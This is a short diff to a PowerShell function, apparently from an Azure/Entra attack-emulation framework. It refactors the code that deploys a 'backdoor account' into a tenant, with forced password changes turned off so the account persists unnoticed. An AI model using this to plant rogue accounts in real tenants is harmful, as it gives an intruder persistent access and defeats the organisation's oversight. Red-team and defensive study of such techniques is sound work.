@@ -40,10 +40,11 @@ function CreateAccount {
     #Create new account
     try {
         MAADWriteProcess "Attempting to deploy backdoor account in tenant"
-        $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
-        $PasswordProfile.Password = $new_backdoor_pass
-        $PasswordProfile.EnforceChangePasswordPolicy = $false
-        $PasswordProfile.ForceChangePasswordNextLogin = $false
+        $PasswordProfile = @{
+            Password = $new_backdoor_pass
+            EnforceChangePasswordPolicy = $false
+            ForceChangePasswordNextLogin = $false
+        }
         $backdoor_details = New-EntraUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop 
         Start-Sleep -Seconds 10
         MAADWriteProcess "Backdoor account added to tenant"
